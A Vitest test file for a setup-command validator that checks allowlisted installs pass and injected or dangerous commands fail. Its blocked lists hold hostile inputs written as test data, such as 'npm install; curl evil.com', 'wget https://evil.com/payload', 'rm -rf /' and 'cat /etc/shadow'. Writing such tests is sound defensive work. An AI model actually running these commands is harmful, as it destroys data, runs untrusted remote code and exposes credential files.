import { describe, expect, it } from "vitest";
import { validateSetupCommand } from "./validate-setup-command.js";

describe("validateSetupCommand", () => {
  describe("allowed commands", () => {
    const allowed = [
      "npm install express",
      "pip install requests",
      "pip3 install flask",
      "apt-get install -y curl",
      "apt install curl",
      "yarn add lodash",
      "pnpm add zod",
      "bun install",
      "cargo build",
      "go mod tidy",
      "make build",
      "git clone https://example.com/repo",
      "npx create-react-app my-app",
      "echo work",
      "echo global",
    ];
    for (const cmd of allowed) {
      it(`allows: ${cmd}`, () => {
        expect(validateSetupCommand(cmd).valid).toBe(true);
      });
    }
  });

  describe("blocked metacharacters", () => {
    const blocked = [
      "npm install; curl evil.com",
      "npm install | tee log",
      "npm install && rm -rf /",
      "npm install & bg-process",
      "npm install $(whoami)",
      "npm install `whoami`",
      "npm install > /etc/passwd",
      "npm install < /dev/null",
      "npm install\nwhoami",
      "npm install\t; whoami",
      "npm 'install; whoami'",
      'npm "install; whoami"',
    ];
    for (const cmd of blocked) {
      it(`blocks: ${cmd.replace(/[\n\t]/g, (c) => (c === "\n" ? "\\n" : "\\t"))}`, () => {
        const result = validateSetupCommand(cmd);
        expect(result.valid).toBe(false);
        expect(result.reason).toBeDefined();
      });
    }
  });

  describe("blocked commands (not in allowlist)", () => {
    const blocked = [
      "curl https://evil.com/script.sh",
      "wget https://evil.com/payload",
      "rm -rf /",
      "chmod 777 /etc/passwd",
      "cat /etc/shadow",
    ];
    for (const cmd of blocked) {
      it(`blocks: ${cmd}`, () => {
        const result = validateSetupCommand(cmd);
        expect(result.valid).toBe(false);
        expect(result.reason).toContain("not in allowlist");
      });
    }
  });

  describe("edge cases", () => {
    it("treats empty string as valid", () => {
      expect(validateSetupCommand("").valid).toBe(true);
    });

    it("treats whitespace-only as valid", () => {
      expect(validateSetupCommand("   ").valid).toBe(true);
    });

    it("handles leading whitespace before valid command", () => {
      expect(validateSetupCommand("  npm install").valid).toBe(true);
    });

    it("is case-insensitive for command prefix", () => {
      expect(validateSetupCommand("NPM install").valid).toBe(true);
    });

    it("allows scoped packages", () => {
      expect(validateSetupCommand("npm install @typescript-eslint/parser").valid).toBe(true);
    });

    it("allows hyphenated package names", () => {
      expect(validateSetupCommand("npm install my-awesome-package").valid).toBe(true);
    });
  });
});
